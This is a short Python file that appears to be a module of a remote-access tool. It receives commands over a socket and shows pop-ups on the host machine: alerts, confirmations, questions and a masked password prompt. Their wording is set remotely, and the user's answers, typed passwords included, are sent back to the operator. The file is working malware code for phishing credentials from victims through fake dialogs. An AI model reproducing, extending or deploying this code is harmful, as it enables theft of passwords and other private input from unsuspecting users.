import socket
from pymsgbox import alert,confirm,prompt,password
from time import sleep
def popup(conn,command):
    if command[2:7]=="alert":
        lsCommnand=command.strip().split("|")
        alert(lsCommnand[2],lsCommnand[1])
    elif command[2:7]=="confr":
        lsCommnand=command.strip().split("|")
        lsButtons=lsCommnand[3].split(',')
        resault=confirm(text=lsCommnand[2], title=lsCommnand[1], buttons=lsButtons)
        conn.send(resault.encode())
    elif command[2:8]=="qstion":
        lsCommnand=command.strip().split("|")
        resault=prompt(text=lsCommnand[2], title=lsCommnand[1])
        conn.send(resault.encode())
    elif command[2:8]=="passwd":
        lsCommnand=command.strip().split("|")
        resault=password(text=lsCommnand[2], title=lsCommnand[1], mask='*')
        conn.send(resault.encode())
def commandRunner(conn,command,key):
    while 1:
        sleep(0.25)
        if command[0:2]=="WN":
            popup(conn,command)
            conn.send(b"END")
            break
        else :
            break